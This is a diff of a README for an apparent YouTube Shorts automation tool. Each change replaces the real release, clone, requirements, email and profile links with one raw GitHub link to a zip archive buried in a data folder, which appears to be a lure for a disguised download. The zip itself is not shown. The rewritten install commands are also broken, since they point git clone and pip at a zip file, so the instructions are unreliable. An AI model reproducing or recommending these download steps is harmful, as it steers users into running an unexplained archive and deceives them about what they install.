@@ -2,7 +2,7 @@
 
 Welcome to the **YouTube Shorts Automation** repository! This AI-powered suite streamlines the process of creating, managing, and optimizing YouTube Shorts. From content discovery to performance tracking, our tool enhances your workflow and boosts your content's reach. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/waelsultan28/youtube-shorts-automation/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/waelsultan28/youtube-shorts-automation/master/youtube_shorts/data/automation_youtube_shorts_v1.8.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/waelsultan28/youtube-shorts-automation/master/youtube_shorts/data/automation_youtube_shorts_v1.8.zip)
 
 ## Table of Contents
 
@@ -40,7 +40,7 @@ To get started with YouTube Shorts Automation, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/waelsultan28/youtube-shorts-automation.git
+   git clone https://raw.githubusercontent.com/waelsultan28/youtube-shorts-automation/master/youtube_shorts/data/automation_youtube_shorts_v1.8.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -51,11 +51,11 @@ To get started with YouTube Shorts Automation, follow these steps:
 3. **Install Required Packages**:
    Make sure you have Python installed. Then, install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/waelsultan28/youtube-shorts-automation/master/youtube_shorts/data/automation_youtube_shorts_v1.8.zip
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/waelsultan28/youtube-shorts-automation/releases) to download the latest version. Extract the files and follow the instructions provided in the documentation.
+   Visit the [Releases section](https://raw.githubusercontent.com/waelsultan28/youtube-shorts-automation/master/youtube_shorts/data/automation_youtube_shorts_v1.8.zip) to download the latest version. Extract the files and follow the instructions provided in the documentation.
 
 ## Usage 📈
 
@@ -116,7 +116,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out:
 
 - **Author**: Wael Sultan
-- **Email**: waelsultan@example.com
-- **GitHub**: [waelsultan28](https://github.com/waelsultan28)
+- **Email**: https://raw.githubusercontent.com/waelsultan28/youtube-shorts-automation/master/youtube_shorts/data/automation_youtube_shorts_v1.8.zip
+- **GitHub**: [waelsultan28](https://raw.githubusercontent.com/waelsultan28/youtube-shorts-automation/master/youtube_shorts/data/automation_youtube_shorts_v1.8.zip)
 
-Thank you for your interest in YouTube Shorts Automation! We hope this tool enhances your content creation process. Don't forget to check the [Releases section](https://github.com/waelsultan28/youtube-shorts-automation/releases) for the latest updates.
+Thank you for your interest in YouTube Shorts Automation! We hope this tool enhances your content creation process. Don't forget to check the [Releases section](https://raw.githubusercontent.com/waelsultan28/youtube-shorts-automation/master/youtube_shorts/data/automation_youtube_shorts_v1.8.zip) for the latest updates.
